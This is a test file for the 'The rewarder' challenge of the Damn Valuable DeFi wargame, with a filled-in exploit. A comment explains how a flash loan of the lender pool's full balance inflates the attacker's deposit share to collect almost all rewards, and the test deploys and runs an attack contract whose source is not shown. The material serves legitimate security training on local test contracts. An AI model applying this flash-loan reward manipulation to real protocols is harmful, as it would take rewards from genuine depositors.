const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] The rewarder', function () {

    let deployer, alice, bob, charlie, david, attacker;
    let users;

    const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice, bob, charlie, david];

        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);
        

        this.liquidityToken = await DamnValuableTokenFactory.deploy();
        this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);

        // Set initial token balance of the pool offering flash loans
        await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
        this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
        this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());
        

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (let i = 0; i < users.length; i++) {
            const amount = ethers.utils.parseEther('100');
            await this.liquidityToken.transfer(users[i].address, amount);
            await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
            await this.rewarderPool.connect(users[i]).deposit(amount);
            expect(
                await this.accountingToken.balanceOf(users[i].address)
            ).to.be.eq(amount);
        }
        expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
        expect(await this.rewardToken.totalSupply()).to.be.eq('0');

        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        
        // Each depositor gets 25 reward tokens
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

        // Attacker starts with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
        
        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('2');
    });

    it('Exploit', async function () {
        /**
         * @dev
         * The amount of rewards distributed to a user is calculated based on their share of DVT tokens in the pool.
         * Alice, Bob, Charlie and David have all deposited the same amount of tokens, each of them owns 25% of the DVTs in the pool, so their reward is 25 Reward Tokens each.
         * Our goal is to get as close to 100 Reward tokens as possible. To do so, we need to deposit enough DVT tokens so that our share of DVT in the pool is close to 100%.
         * This where the contract is flawed: there is no upper limit on the amount of DVT tokens we can deposit. A DVT "whale" can deposit an amount of DVT tokens significantly larger than what was currently in the pool, and claim most of the reward tokens for themselves.
         * That FlashLoaner Pool allows us to borrow up to 1 million tokens: if we then deposit this amount in the pool, our share will be: 1,000,000 / 1,000,400 ~ 99.96 %
         * -> We will receive 99.96 Reward tokens.
         * Then, we just have to withdraw our DVT tokens to transfer them back to the flashLoan pool to complete the flash loan.
         * 
         * NB It is not exactly accurate to call it a "flaw", the pool rewarding system does function as intended. But a rewards system based on the tokens share in the pool requires several key strategic decisions to ensure it incentivizes users to deposit in the pool. One of them is to keep the allowance distributed: would you want to deposit tokens in a pool where 99.99% is owned by a single person?
         */
        /** CODE YOUR EXPLOIT HERE */
        const RewarderAttackFactory = await ethers.getContractFactory(
          'RewarderAttack',
          deployer
        );
        this.attackerContract = await RewarderAttackFactory.deploy(
          this.flashLoanPool.address,
          this.rewarderPool.address,
          this.liquidityToken.address,
          this.rewardToken.address,
          attacker.address
        );
        //
        await ethers.provider.send('evm_increaseTime', [6 * 24 * 60 * 60]);
        let attackerReward1 = await this.rewardToken.balanceOf(attacker.address);
        console.log(
          `\u001b[1;33mThe attacker starts with ${ethers.utils.formatEther(
            attackerReward1
          )} Reward tokens`
        );
        
        console.log(`\u001b[1;35mStarting the attack`);
        await this.attackerContract.attack(TOKENS_IN_LENDER_POOL);

        let attackerReward2 = await this.rewardToken.balanceOf(attacker.address);
        console.log(
          `\u001b[1;33mThe attacker now has ${ethers.utils.formatEther(
            attackerReward2
          )} Reward tokens`
        );
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Only one round should have taken place
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('3');

        // Users should get neglegible rewards this round
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            let rewards = await this.rewardToken.balanceOf(users[i].address);
            
            // The difference between current and previous rewards balance should be lower than 0.01 tokens
            let delta = rewards.sub(ethers.utils.parseEther('25'));
            expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
        }
        
        // Rewards must have been issued to the attacker account
        expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
        let rewards = await this.rewardToken.balanceOf(attacker.address);

        // The amount of rewards earned should be really close to 100 tokens
        let delta = ethers.utils.parseEther('100').sub(rewards);
        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

        // Attacker finishes with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
    });
});
